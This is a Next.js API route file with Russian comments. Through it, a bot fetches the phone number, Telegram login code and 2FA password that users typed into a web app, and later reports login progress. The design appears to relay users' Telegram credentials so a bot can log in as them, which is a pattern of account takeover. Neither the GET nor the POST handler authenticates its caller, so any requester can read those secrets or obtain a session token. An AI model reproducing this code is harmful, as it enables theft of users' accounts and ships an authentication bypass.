import { type NextRequest, NextResponse } from "next/server"
import { getTelegramAuth, updateTelegramAuth, createSession } from "@/lib/auth-store"

// API для бота - обновление статуса авторизации
// Бот вызывает этот endpoint после проверки кода/пароля
export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { telegramId, action, success, error, has2FA } = body

    if (!telegramId || !action) {
      return NextResponse.json({ success: false, error: "Missing required fields" }, { status: 400 })
    }

    const telegramIdStr = telegramId.toString()
    const auth = getTelegramAuth(telegramIdStr)

    if (!auth) {
      return NextResponse.json(
        {
          success: false,
          error: "Auth session not found",
        },
        { status: 400 },
      )
    }

    switch (action) {
      case "code_sent":
        // Код отправлен в Telegram
        updateTelegramAuth(telegramIdStr, {
          status: "pending_code",
        })
        break

      case "code_verified":
        // Код подтверждён
        if (has2FA) {
          // Требуется 2FA
          updateTelegramAuth(telegramIdStr, {
            status: "pending_2fa",
            has2FA: true,
          })
        } else {
          // Авторизация завершена
          const sessionToken = createSession(telegramIdStr, auth.phone)
          updateTelegramAuth(telegramIdStr, {
            status: "completed",
          })
          return NextResponse.json({
            success: true,
            sessionToken,
            status: "completed",
          })
        }
        break

      case "2fa_verified":
        // 2FA пройдена
        const sessionToken = createSession(telegramIdStr, auth.phone)
        updateTelegramAuth(telegramIdStr, {
          status: "completed",
        })
        return NextResponse.json({
          success: true,
          sessionToken,
          status: "completed",
        })

      case "error":
        // Ошибка авторизации
        updateTelegramAuth(telegramIdStr, {
          status: "error",
          errorMessage: error || "Unknown error",
        })
        break

      default:
        return NextResponse.json({ success: false, error: "Unknown action" }, { status: 400 })
    }

    return NextResponse.json({
      success: true,
      status: auth.status,
    })
  } catch (error) {
    console.error("Error in bot callback:", error)
    return NextResponse.json({ success: false, error: "Internal server error" }, { status: 500 })
  }
}

// GET - бот получает текущий статус и введённый код/пароль
export async function GET(request: NextRequest) {
  try {
    const telegramId = request.nextUrl.searchParams.get("telegramId")

    if (!telegramId) {
      return NextResponse.json({ success: false, error: "Missing telegramId" }, { status: 400 })
    }

    const auth = getTelegramAuth(telegramId)

    if (!auth) {
      return NextResponse.json(
        {
          success: false,
          error: "No auth session",
        },
        { status: 404 },
      )
    }

    return NextResponse.json({
      success: true,
      phone: auth.phone,
      code: auth.code, // Код или пароль, введённый пользователем в WebApp
      status: auth.status,
      has2FA: auth.has2FA,
      phoneCodeHash: auth.phoneCodeHash,
    })
  } catch (error) {
    console.error("Error getting auth status:", error)
    return NextResponse.json({ success: false, error: "Internal server error" }, { status: 500 })
  }
}
